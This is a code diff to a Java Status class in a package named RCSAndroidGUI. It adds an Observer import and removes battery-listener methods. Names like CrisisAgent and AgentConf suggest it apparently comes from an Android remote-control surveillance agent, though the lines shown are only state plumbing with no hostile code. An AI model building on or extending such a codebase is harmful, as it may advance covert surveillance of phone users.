@@ -18,6 +18,7 @@ import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.CrisisAgent;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.EventConf;
+import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -57,10 +58,8 @@ public class Status {
 	private boolean crisis = false;
 	private int crisisType;
 
-
-	private Object triggeredSemaphore=new Object();
-	private BatteryListener batteryListener;
-
+	private Object triggeredSemaphore = new Object();
+	
 	/**
 	 * Instantiates a new status.
 	 */
@@ -69,8 +68,6 @@ public class Status {
 		eventsMap = new HashMap<Integer, EventConf>();
 		actionsMap = new HashMap<Integer, Action>();
 		optionsMap = new HashMap<Integer, Option>();
-		
-		batteryListener = new BatteryListener();
 	}
 
 	/** The singleton. */
@@ -525,17 +522,5 @@ public class Status {
 
 	public void setRestarting(boolean b) {
 		// TODO Auto-generated method stub
-	}
-	
-	public void batteryMonitor(Battery b) {
-		batteryListener.run(b);
-	}
-	
-	public void attachToBattery(Object o) {
-		batteryListener.attach(o);
-	}
-	
-	public void detachFromBattery(Object o) {
-		batteryListener.detach(o);
 	}
 }
